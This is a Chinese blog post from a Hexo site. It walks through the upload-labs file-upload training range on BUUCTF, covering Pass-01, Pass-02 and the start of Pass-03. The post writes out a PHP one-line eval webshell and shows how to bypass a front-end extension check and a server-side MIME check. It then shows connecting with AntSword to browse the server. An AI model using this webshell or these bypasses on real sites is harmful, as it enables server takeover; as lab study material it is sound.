<script>"serviceWorker"in navigator&&window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})).them((()=>{"true"!=window.localStorage.getItem("install")&&(window.localStorage.setItem("install","true"),location.reload())}))</script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>upload-labs 完整训练 | h-t-m</title><meta name="keywords" content="网络安全,BUUCTF,文件上传"><meta name="author" content="h-t-m"><meta name="copyright" content="h-t-m"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="再开篇文章把 upload-labs 所有的关卡都刷完！"><meta property="og:type" content="article"><meta property="og:title" content="upload-labs 完整训练"><meta property="og:url" content="https://h-t-m.top/posts/ddd5444f/"><meta property="og:site_name" content="h-t-m"><meta property="og:description" content="再开篇文章把 upload-labs 所有的关卡都刷完！"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://pic.h-t-m.ltd/img/upload-labs.webp"><meta property="article:published_time" content="2022-05-04T14:02:10.000Z"><meta property="article:modified_time" content="2022-11-05T09:06:49.941Z"><meta property="article:author" content="h-t-m"><meta property="article:tag" content="网络安全"><meta property="article:tag" content="BUUCTF"><meta property="article:tag" content="文件上传"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://pic.h-t-m.ltd/img/upload-labs.webp"><link rel="shortcut icon" href="/images/~logo.gif"><link rel="canonical" href="https://h-t-m.top/posts/ddd5444f/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//s4.cnzz.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="manifest" href="/manifest.json"><meta name="msapplication-TileColor" content="#132c33"><link rel="apple-touch-icon" sizes="180x180" href="/logo/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/logo/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/logo/favicon-16x16.png"><link rel="mask-icon" href="/logo/safari-pinned-tab.svg" color="#5bbad5"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://npm.elemecdn.com/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?2b93c7896a6f4dc63301e461b14f5b59";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-214297516-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-214297516-1")</script><script async data-pjax="data-pjax" src="https://s4.cnzz.com/z_stat.php?id=1280663206&amp;web_id=1280663206"></script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:{limitCount:50,languages:{author:"作者: h-t-m",link:"链接: ",source:"来源: h-t-m",info:"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#121212",position:"bottom-left"},source:{jQuery:"https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js",justifiedGallery:{js:"https://npm.elemecdn.com/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://npm.elemecdn.com/justifiedGallery/dist/css/justifiedGallery.min.css"},fancybox:{js:"https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js",css:"https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"}},isPhotoFigcaption:!0,islazyload:!1,isanchor:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"upload-labs 完整训练",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2022-11-05 17:06:49"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise(((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)})),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme"),o=(new Date).getHours();void 0===t?o<=6||o>=18?activateDarkMode():activateLightMode():"light"===t?activateLightMode():activateDarkMode();const n=saveToLocal.get("aside-status");void 0!==n&&("hide"===n?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));const a=saveToLocal.get("global-font-size");void 0!==a&&document.documentElement.style.setProperty("--global-font-size",a+"px");const c=()=>{GLOBAL_CONFIG_SITE.isHome&&/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")};c(),document.addEventListener("pjax:complete",c)})(window)</script><link rel="stylesheet" href="/css/copyright.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/font-awesome-animation.min.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/tag_plugins.css" media="defer" onload='this.media="all"'><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload='this.media="all"'><meta name="generator" content="Hexo 6.0.0"></head><body><a href="javascript:void(0);" onclick="preloader.endLoading()" title="点击跳过动画"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><img class="load-image" src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif" alt=""></div></a><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/logo.jpg" onerror='onerror=null,src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>所有文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>珍藏</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>社交</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>说说</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>关于</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>我</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>她</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>我们</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url('https://pic.h-t-m.ltd/img/BUUCTF-top.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h-t-m</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>所有文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>珍藏</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>社交</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>说说</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>关于</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>我</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>她</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>我们</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">upload-labs 完整训练</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-04T14:02:10.000Z" title="发表于 2022-05-04 22:02:10">2022-05-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-05T09:06:49.941Z" title="更新于 2022-11-05 17:06:49">2022-11-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/CTF/%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/">靶场训练</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">21.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>73分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="upload-labs 完整训练"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>upload-labs 完整训练</h1><blockquote><p><strong>前言</strong></p><p>之前在 <a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF</a> 刷题时有幸看到这个靶场项目，感觉非常不错，因此特地开篇博文记录完整的刷题过程，目前共计21关。最近开的坑有点多，不过，既然开了那就一定会完成的🎉！第一关在此前的 <a href="https://h-t-m.top/posts/3989fe45/">BUUCTF 刷题笔记——Basic 1</a> 中已经完成，为保证完整性，本文也同步记录第一关。其中 Pass-01~04、Pass-06~07、Pass-20 靶机部署于 Linux 系统，Pass-5、Pass-12~14、Pass-16~21 靶机部署于本地，其余均部署于 Windows 系统。至于为什么部署这么乱，正文会解释的……</p><p>由于图片数量非常可观，因此本文中出现的图片全部存储于 <a target="_blank" rel="noopener" href="https://7bu.top/">去不图床</a> ，若失效或遇到其他问题请及时联系本人。</p><p>特别感谢平台作者 <a target="_blank" rel="noopener" href="https://github.com/c0ny1">c0ny1</a></p></blockquote><h2 id="Pass-01">Pass-01</h2><h3 id="启动靶机-11">启动靶机</h3><ul><li><p>打开网页，页面还是挺好看的，虽然这并不重要。</p><img src="https://bu.dusays.com/2022/05/11/627bdb291eba0.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-4">研究页面</h3><ul><li><p>既然有上传图片的功能，那就上传一张看看。</p><img src="https://bu.dusays.com/2022/05/09/6278b01318dc0.webp" alt="" style="zoom:75%"></li><li><p>一切正常，根据图片 url 可以看出文件被上传至网页目录的 <kbd>upload</kbd> 目录下。</p><img src="https://bu.dusays.com/2022/05/09/6278b014a5ce5.webp" alt="" style="zoom:75%"></li><li><p>再上传一个其他文件看看，被阻止了，说是只支持 <kbd>jpg/png/gif</kbd> 三种文件，老实说不支持 <kbd>webp</kbd> 我不是很认可。</p><img src="https://bu.dusays.com/2022/05/09/6278b01603cf6.webp" alt="" style="zoom:75%"></li><li><p>也就是说，我们只能上传这三种文件，想通过上传我们的木马武装夺旗，就只能想办法突破这种限制。作为小白，理所应当地查看提示：</p><img src="https://bu.dusays.com/2022/05/09/6278b01702eed.webp" alt="" style="zoom:75%"></li><li><p>使用 js 检查可还行，意味着检查在前端完成，而前端完全可以由我们自行操作！</p></li></ul><h3 id="突破限制-2">突破限制</h3><ul><li><p>这里可以先创建好一个文件，先编写好所谓的“一句话木马”。</p><blockquote><p><strong>一句话木马</strong></p><p>将仅含一行代码的程序文件上传至目标网站，如 PHP 代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;h-t-m&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><kbd>@</kbd> 表示其后代码即使出错也将不会报错。</li><li><kbd>eval()</kbd> 函数表示将参数当作代码来执行。</li><li><kbd>&#36;_POST[]</kbd> 表示以 post 方式获取变量。</li></ul><p>也就是说，我们将文件上传之后，即可用对应方法向网站提交代码并执行，这里使用 post 方法。虽然我们直接定义了自己的变量名 <kbd>h-t-m</kbd>，但是 <kbd>@</kbd> 可以保证不会报错。于是我们完全可以通过这个文件直接连接至服务器。</p></blockquote></li><li><p>由于只是 js 检查，为表示对检查的尊重，我们大可以嚣张一点，将文件名命名为 <kbd>木马.php</kbd>。</p><img src="https://bu.dusays.com/2022/05/09/6278b01801170.webp" alt="" style="zoom:75%"></li><li><p>突破前端检查，可以直接修改对应的 js 代码，也可以直接在浏览器禁用 JavaScript ，或者直接删除 HTML 中对检查代码的调用。</p><p><strong>以下三种方法任选其一即可</strong></p><ul><li><p>修改 js 代码需要在控制台重构函数，直接原地修改无效。查看语句找到该检查函数如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，文件类型的限定语句为 <code>var allow_ext = &quot;.jpg|.png|.gif&quot;;</code> 那么只要将我们要上传的文件的后缀名加入，并在控制台中执行即可：</p><img src="https://bu.dusays.com/2022/05/09/6278b01b256d8.webp" alt="" style="zoom:75%"></li><li><p>禁用 JavaScript ：右键——检查——设置——禁用即可</p><img src="https://bu.dusays.com/2022/05/09/6278b02bc19fe.webp" alt="" style="zoom:75%"></li><li><p>删除 HTML 中代码即删除如图语句即可</p><img src="https://bu.dusays.com/2022/05/09/6278b018e3961.webp" alt="" style="zoom:75%"></li></ul></li><li><p>解除限制之后，便可以将文件上传了</p><img src="https://bu.dusays.com/2022/05/09/6278b01c13623.webp" alt="" style="zoom:75%"></li><li><p>刚开始对页面研究时我们得知，文件是直接上传至网页所在目录的 <kbd>upload</kbd> 目录下的，因此可以得知我们上传的文件的 URL 为 <code>http://靶机地址/upload/木马.php</code> ，当然也可以在上传页直接查看文件地址。值得注意的是，URL 中不应包含中文字符，这里取的这个名字显然是不能直接这么用了，改名是不可能改名的，因此这里需要编码一下 <code>http://[靶机地址]/upload/%E6%9C%A8%E9%A9%AC.php</code> 。</p></li></ul><h3 id="入侵-2">入侵</h3><ul><li><p>上传好木马后，就该使用工具进入整个后台服务器了。中国蚁剑既可以完成这个任务，配置安装入门可参考官方 <a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword/blob/master/README_CN.md">中文文档</a> 。打开软件添加连接：</p><img src="https://bu.dusays.com/2022/05/09/6278b01f31e6a.webp" alt="" style="zoom:75%"></li><li><p>注意到，这里需要输入密码，那么密码是什么呢？在前面输入的一句话代码中， <code>&lt;?php @eval($_POST[&quot;h-t-m&quot;]);?&gt;</code> ，我们将通过 post 方法将内容传输至 <kbd>h-t-m</kbd> 变量中而实现入侵，而这个变量就是进入服务器所需要的连接密码。因此，输入变量名即可。</p><img src="https://bu.dusays.com/2022/05/09/6278b0219b431.webp" alt="" style="zoom:75%"></li><li><p>添加成功后双击连接即可进入木马文件所在目录，右边同样可以看到目录列表，因此现在我们已经拥有了网站所有的文件了，并且可以进行任意增删改查！</p><img src="https://bu.dusays.com/2022/05/09/6278b0227f79a.webp" alt="" style="zoom:75%"></li></ul><h3 id="寻找-flag-2">寻找 flag</h3><ul><li><p>既然已经获得所有权了，那就可以慢慢找了。不过，目前的经验表明，flag 一般会放在根目录，因此首先查看根目录，果不其然：</p><img src="https://bu.dusays.com/2022/05/09/6278b0280afb4.webp" alt="" style="zoom:75%"></li><li><p>都到这一步了，就双击打开吧！</p><img src="https://bu.dusays.com/2022/05/09/6278b02924fa4.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-02">Pass-02</h2><h3 id="启动靶机-12">启动靶机</h3><ul><li><p>第二关的界面没有任何变化。</p><img src="https://bu.dusays.com/2022/05/09/6278b00fcb452.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-5">研究页面</h3><ul><li><p>上传一个图片文件，可以正常上传，且依然上传在了网站目录的 <kbd>upload</kbd> 目录下。</p><img src="https://bu.dusays.com/2022/05/09/6278b01097a5d.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/09/6278b019b7879.webp" alt="" style="zoom:75%"></li><li><p>再上传一个其他文件，无法正常上传，且提示错误信息与上次不同。</p><img src="https://bu.dusays.com/2022/05/09/6278b01d2c157.webp" alt="" style="zoom:75%"></li><li><p>小白表示线索不够，依然选择看提示，提示显示：<code>本pass在服务端对数据包的 MIME 进行检查！X2</code> 。虽然不知道为啥要显示两遍，但显然这很重要！</p><img src="https://bu.dusays.com/2022/05/09/6278b01e4a703.webp" alt="" style="zoom:75%"><blockquote><p><strong>注</strong>：由于在提示加载出来之前我快速点击了两遍，因此才会显示两遍。</p></blockquote></li><li><p>所以，什么是 <kbd>MIME</kbd>？</p><blockquote><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><div align="right">——百度百科</div></blockquote><p>显然这个解释帮助不是很大，但是我们有必要知道的就是，<code>MIME</code> 信息头中有以下几个重要字段：</p><ol><li><kbd>MIME-Version</kbd>: 提供所用的 <kbd>MIME</kbd> 版本号。</li><li><kbd>Content-Type</kbd>: 表示数据类型。</li><li><kbd>Content-Transfer-Encoding</kbd>: 表示对数据执行的编码方式。</li></ol><p>如果要对数据包的 <kbd>MIME</kbd> 进行检查，那么显然当我们上传木马文件的时候就没办法通过服务器对 <kbd>Content-Type</kbd> 的限制了。</p></li><li><p>既然如此，我们就可以查看一下源码：</p><img src="https://bu.dusays.com/2022/05/09/6278b020845f5.webp" alt="" style="zoom:75%"><p>里面最关键的就是 <kbd>if</kbd> 判断语句中的内容，他决定我们能否上传：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)</span><br></pre></td></tr></table></figure><p>不难看出，该判断语句将 <kbd>MIME</kbd> 信息头的 <kbd>Content-Type</kbd> 字段限制在了 <kbd>image/jpeg</kbd> 、 <kbd>image/png</kbd> 、 <kbd>image/gif</kbd> 三种类型中。</p></li><li><p>由于判断发生在服务端，因此继续修改前端代码就有点自欺欺人了。为了让我们的木马文件继续符合条件，我们有必要抓包了！</p></li></ul><h3 id="突破限制-3">突破限制</h3><ul><li><p>首先依然先准备好一句话木马文件，与第一关一样。</p></li><li><p>打开 <kbd>BurpSuite</kbd> 并在内部浏览器打开网页，准备抓包：</p><img src="https://bu.dusays.com/2022/05/09/6278b0240c050.webp" alt="" style="zoom:75%"></li><li><p>将我们的木马文件上传，可以看到抓包的内容，其中就有我们所关注的 <kbd>Content-Type</kbd> 字段：</p><img src="https://bu.dusays.com/2022/05/09/6278b0263fc57.webp" alt="" style="zoom:75%"><p>直接修改这个字段，让我们的字段符合条件然后点击 <kbd>Forward</kbd> 即可：</p><img src="https://bu.dusays.com/2022/05/09/6278b02a61c74.webp" alt="" style="zoom:75%"></li><li><p>返回网页即可看到，我们的文件已经成功上传了！</p><img src="https://bu.dusays.com/2022/05/09/6278b02ca8766.webp" alt="" style="zoom:75%"></li><li><p>一开始上传图片的时候我们便知道，文件依然存储于网站目录的 <kbd>upload</kbd> 目录下，因此木马文件所在的 URL 还是：<code>http://靶机地址/upload/木马.php</code> ，当然，编码后为 <code>http://[靶机地址]/upload/%E6%9C%A8%E9%A9%AC.php</code> 。也可以右键新标签页打开文件，地址栏直接复制地址，后面都推荐使用这种方式！</p></li></ul><h3 id="夺旗">夺旗</h3><ul><li><p>上传成功那剩下就还是老样子了，先在中国蚁剑中添加链接：</p><img src="https://bu.dusays.com/2022/05/09/6278b02d7e507.webp" alt="" style="zoom:75%"></li><li><p>然后进入网站目录列表：</p><img src="https://bu.dusays.com/2022/05/09/6278b02e60195.webp" alt="" style="zoom:75%"></li><li><p>根据前面的经验，直接访问根目录，打开 <code>flag</code> ，夺旗成功！</p><img src="https://bu.dusays.com/2022/05/09/6278b02f3de14.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-03">Pass-03</h2><h3 id="启动靶机-13">启动靶机</h3><ul><li><p>熟悉的界面一点没变</p><img src="https://bu.dusays.com/2022/05/09/6278b030453b4.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面">研究界面</h3><ul><li><p>显然上传目录是不会改变的，因此不再检测图片，直接传木马！</p><img src="https://bu.dusays.com/2022/05/09/6278b0310f62a.webp" alt="" style="zoom:75%"><p>那当然是没这么简单的，果不其然返回了错误信息，但是第三关的错误信息跟第二关就不太一样了。之前是只让传图片，现在是直接给可能的木马文件拉了黑名单。</p></li><li><p>错误信息表明应该只限制了 <kbd>.asp</kbd>、<kbd>.aspx</kbd>、<kbd>.php</kbd>、<kbd>.jsp</kbd> 这四种文件后缀名而已，如果是这样的话，我们只要修改后缀名即可上传成功。查看源代码确认：</p><img src="https://bu.dusays.com/2022/05/09/6278b0328d240.webp" alt="" style="zoom:75%"><p>由这两句可以看出，确实是仅仅限制了这四种后缀名而已。</p></li><li><p>可以注意源代码中有这么一行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>这意味着不仅这四种后缀名，还包括他们的大小写形式都被屏蔽了，即形如 <kbd>.PhP</kbd> 、<kbd>.pHP</kbd> 、<kbd>.PHP</kbd> 等。</p></li></ul><h3 id="突破限制-4">突破限制</h3><ul><li><p>那么，后缀名如何修改才能不影响木马文件的使用呢？</p><blockquote><p>在 <code>php5 module for apache2(libapache2-mod-php5)</code> 中默认允许将多个扩展作为 <kbd>php</kbd> 